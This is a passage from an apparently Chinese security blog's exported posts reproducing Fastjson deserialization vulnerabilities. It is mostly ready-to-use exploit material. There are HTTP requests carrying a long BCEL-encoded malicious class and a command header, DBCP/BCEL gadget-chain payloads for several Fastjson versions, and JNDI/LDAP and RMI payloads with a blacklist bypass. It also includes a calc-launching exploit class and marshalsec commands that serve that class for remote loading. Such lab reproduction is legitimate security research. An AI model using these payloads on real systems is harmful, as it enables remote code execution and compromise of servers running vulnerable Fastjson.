b5$Ks$5d$eb$b0$c2$d5$86$h$5d$j$uqua$jy$b9$c6$b5$8d$feU$ed$b5$bb$ae$fc$o$aa9$k$L$b9K4$t$7c$f6$8e$c7$ed$3c$ee$a0$v$A$da$ca$d4d$b3x$f4s$X$f0$a4$3d$Yv$bc$84C$dby$uuR$c5$L$f0$bd$I$ef$r$g$3fn$5b$Q$f87$bc$ad$q$c3$e6y$82$d4$bb$a0$fe$H$d8$3e$ebc$Z$Q$A$A&#125;&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"1-2-33-lt-x3D-fastjson-lt-x3D-1-2-47\"><a href=\"#1-2-33-lt-x3D-fastjson-lt-x3D-1-2-47\" class=\"headerlink\" title=\"1.2.33 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47\"></a>1.2.33 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST /json HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>:<span class=\"number\">9092</span></span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">cmd: whoami</span><br><span class=\"line\">Content-Length: <span class=\"number\">3647</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;xx&quot;</span>:</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;@type&quot;</span> : <span class=\"string\">&quot;java.lang.Class&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;val&quot;</span>   : <span class=\"string\">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">&quot;x&quot;</span> : &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;name&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;@type&quot;</span> : <span class=\"string\">&quot;java.lang.Class&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;val&quot;</span>   : <span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;@type&quot;</span>:<span class=\"string\">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;c&quot;</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;@type&quot;</span>:<span class=\"string\">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class=\"line\">                    <span class=\"string\">&quot;@type&quot;</span> : <span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                <span class=\"string\">&quot;driverClassName&quot;</span>:<span class=\"string\">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A&quot;</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; : <span class=\"string\">&quot;xxx&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"1-2-33-lt-x3D-fastjson-lt-x3D-12-36\"><a href=\"#1-2-33-lt-x3D-fastjson-lt-x3D-12-36\" class=\"headerlink\" title=\"1.2.33&lt;&#x3D;fastjson&lt;&#x3D;12.36\"></a>1.2.33&lt;&#x3D;fastjson&lt;&#x3D;12.36</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;name&quot;</span>:</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;@type&quot;</span> : <span class=\"string\">&quot;java.lang.Class&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;val&quot;</span>   : <span class=\"string\">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">&quot;x&quot;</span> : &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;name&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;@type&quot;</span> : <span class=\"string\">&quot;java.lang.Class&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;val&quot;</span>   : <span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;@type&quot;</span>:<span class=\"string\">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;c&quot;</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;@type&quot;</span>:<span class=\"string\">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class=\"line\">                    <span class=\"string\">&quot;@type&quot;</span> : <span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                <span class=\"string\">&quot;driverClassName&quot;</span>:<span class=\"string\">&quot;$$BCEL...&quot;</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; : <span class=\"string\">&quot;ddd&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"1-2-37-lt-x3D-fastjson-lt-x3D-1-2-47\"><a href=\"#1-2-37-lt-x3D-fastjson-lt-x3D-1-2-47\" class=\"headerlink\" title=\"1.2.37&lt;&#x3D;fastjson&lt;&#x3D;1.2.47\"></a>1.2.37&lt;&#x3D;fastjson&lt;&#x3D;1.2.47</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;name&quot;</span>:</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;@type&quot;</span> : <span class=\"string\">&quot;java.lang.Class&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;val&quot;</span>   : <span class=\"string\">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">&quot;x&quot;</span> : &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;name&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;@type&quot;</span> : <span class=\"string\">&quot;java.lang.Class&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;val&quot;</span>   : <span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"string\">&quot;y&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;@type&quot;</span>:<span class=\"string\">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;c&quot;</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;@type&quot;</span>:<span class=\"string\">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class=\"line\">                    <span class=\"string\">&quot;@type&quot;</span> : <span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                <span class=\"string\">&quot;driverClassName&quot;</span>:<span class=\"string\">&quot;$$BCEL$..&quot;</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">                     <span class=\"string\">&quot;$ref&quot;</span>: <span class=\"string\">&quot;$.x.y.c.connection&quot;</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Payload\"><a href=\"#Payload\" class=\"headerlink\" title=\"Payload\"></a>Payload</h2><p>计财OK：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload1<span class=\"punctuation\">:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;org.apache.commons.dbcp.BasicDataSource&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;driverClassLoader&quot;</span><span class=\"punctuation\">:</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;driverClassName&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;###EVIL_CODE###&quot;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload2<span class=\"punctuation\">:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;c&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;org.apache.commons.dbcp.BasicDataSource&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;driverClassLoader&quot;</span><span class=\"punctuation\">:</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;driverClassName&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;###EVIL_CODE###&quot;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;ddd&quot;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n","categories":["漏洞复现"],"tags":["漏洞复现","反序列化","Fasjson"]},{"title":"Fasjson漏洞不出网（本地序列化）","url":"/2022/05/06/Fasjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/","content":"<h1 id=\"Fasjson漏洞复现与分析\"><a href=\"#Fasjson漏洞复现与分析\" class=\"headerlink\" title=\"Fasjson漏洞复现与分析\"></a>Fasjson漏洞复现与分析</h1><h2 id=\"创建项目\"><a href=\"#创建项目\" class=\"headerlink\" title=\"创建项目\"></a>创建项目</h2><p>1.创建一个maven项目</p>\n<p><img src=\"V2bBEVq5-d9VfJOQzwpQZGv95JcBgpDTnScGEAuDQZI.png\" alt=\"image\"></p>\n<p><img src=\"ZYkUDEL0pwcJevSYpWV43dXmSJE2Y-Cb7CG4-7EBo84.png\" alt=\"image\"></p>\n<h2 id=\"配置pom-xml\"><a href=\"#配置pom-xml\" class=\"headerlink\" title=\"配置pom.xml\"></a>配置pom.xml</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"line\">&lt;project xmlns=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class=\"line\">         xmlns:xsi=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class=\"line\">         xsi:schemaLocation=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class=\"line\">    &lt;modelVersion&gt;<span class=\"number\">4.0</span><span class=\"number\">.0</span>&lt;/modelVersion&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;groupId&gt;groupId&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;Fastjson1<span class=\"number\">.2</span>.66_RCE&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;<span class=\"number\">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class=\"line\">    &lt;dependencies&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;<span class=\"number\">1.2</span><span class=\"number\">.67</span>&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;<span class=\"number\">1.5</span><span class=\"number\">.1</span>&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.slf4j&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;slf4j-simple&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;<span class=\"number\">1.7</span><span class=\"number\">.25</span>&lt;/version&gt;</span><br><span class=\"line\">            &lt;scope&gt;test&lt;/scope&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.slf4j&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;<span class=\"number\">1.7</span><span class=\"number\">.25</span>&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;/dependencies&gt;</span><br><span class=\"line\">    &lt;properties&gt;</span><br><span class=\"line\">        &lt;project.build.sourceEncoding&gt;UTF-<span class=\"number\">8</span>&lt;/project.build.sourceEncoding&gt;</span><br><span class=\"line\">        &lt;maven.compiler.encoding&gt;UTF-<span class=\"number\">8</span>&lt;/maven.compiler.encoding&gt;</span><br><span class=\"line\">        &lt;java.version&gt;<span class=\"number\">1.8</span>&lt;/java.version&gt;</span><br><span class=\"line\">        &lt;maven.compiler.source&gt;<span class=\"number\">1.8</span>&lt;/maven.compiler.source&gt;</span><br><span class=\"line\">        &lt;maven.compiler.target&gt;<span class=\"number\">1.8</span>&lt;/maven.compiler.target&gt;</span><br><span class=\"line\">    &lt;/properties&gt;</span><br><span class=\"line\">&lt;/project&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"创建类\"><a href=\"#创建类\" class=\"headerlink\" title=\"创建类\"></a>创建类</h2><p>创建一个测试类</p>\n<p><img src=\"ZIraM7euFC85iz_yp8L9moKDglLVwM1FZZEJ1etDkUA.png\" alt=\"image\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">fasttest</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        System.setProperty(<span class=\"string\">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class=\"string\">&quot;true&quot;</span>);</span><br><span class=\"line\">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">payload</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;org.apache.shiro.jndi.JndiObjectFactory\\&quot;,\\&quot;resourceName\\&quot;:\\&quot;ldap://127.0.0.1:1389/Exploit\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            JSON.parseObject(payload);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>解决报错问题</p>\n<p><img src=\"OVXa8hqM2Aba8EN1xU3ItffLLuCxbalCy663uFaXUVo.png\" alt=\"image\"></p>\n<h2 id=\"创建恶意类\"><a href=\"#创建恶意类\" class=\"headerlink\" title=\"创建恶意类\"></a>创建恶意类</h2><p>Exploit_win_calc类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Exploit_win_calc</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Exploit_win_calc</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 要执行的命令</span></span><br><span class=\"line\">            String[] commands = &#123;<span class=\"string\">&quot;calc.exe&quot;</span>&#125;;</span><br><span class=\"line\">            <span class=\"type\">Process</span> <span class=\"variable\">pc</span> <span class=\"operator\">=</span> Runtime.getRuntime().exec(commands);</span><br><span class=\"line\">            pc.waitFor();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span>(Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] argv)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Exploit_win_calc</span> <span class=\"variable\">e</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Exploit_win_calc</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"启动LDAP服务\"><a href=\"#启动LDAP服务\" class=\"headerlink\" title=\"启动LDAP服务\"></a>启动LDAP服务</h2><p>起一个web服务</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">python37 -m http.server <span class=\"number\">8888</span></span><br></pre></td></tr></table></figure>\n<p>用marshalsec-0.0.3-SNAPSHOT-all.jar起一个LDAP服务（监听在1333端口，默认1389）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-<span class=\"number\">0.0</span><span class=\"number\">.3</span>-SNAPSHOT-<span class=\"built_in\">all</span>.jar marshalsec.jndi.LDAPRefServer <span class=\"string\">&quot;http://127.0.0.1:8888/#Exploit_win_calc&quot;</span> <span class=\"number\">1333</span></span><br></pre></td></tr></table></figure>\n<p>用marshalsec-0.0.3-SNAPSHOT-all.jar起一个RMI服务（监听在9999端口，默认1099）(攻击的代码中需要修改为rmi协议出网)</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-<span class=\"number\">0.0</span><span class=\"number\">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class=\"string\">&quot;http://127.0.0.1:8888/#Exploit_win_calc&quot;</span> <span class=\"number\">9999</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"运行测试类\"><a href=\"#运行测试类\" class=\"headerlink\" title=\"运行测试类\"></a>运行测试类</h2><p><img src=\"n_o9BhzbP2BhN4ZMaqPBlWWFe0ByqjA0zC6XnKPEbRs.png\" alt=\"image\"></p>\n<p><strong>1.2.25~1.2.45</strong></p>\n<p>绕过黑名单的方式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;\\<span class=\"string\">&quot;@type\\&quot;:\\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\\&quot;,\\&quot;properties\\&quot;:&#123;\\&quot;data_source\\&quot;:\\&quot;rmi://127.0.0.1:1099/Exploit\\&quot;&#125;&#125;</span></span><br></pre></td></tr></table></figure>\n<p>pom.xml</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"line\">&lt;project xmlns=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class=\"line\">         xmlns:xsi=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class=\"line\">         xsi:schemaLocation=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class=\"line\">    &lt;modelVersion&gt;<span class=\"number\">4.0</span><span class=\"number\">.0</span>&lt;/modelVersion&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;groupId&gt;groupId&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;Fastjson1<span class=\"number\">.2</span>.39_RCE&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;<span class=\"number\">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class=\"line\">    &lt;dependencies&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;<span class=\"number\">1.2</span><span class=\"number\">.44</span>&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;mybatis&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;<span class=\"number\">3.5</span><span class=\"number\">.2</span>&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span 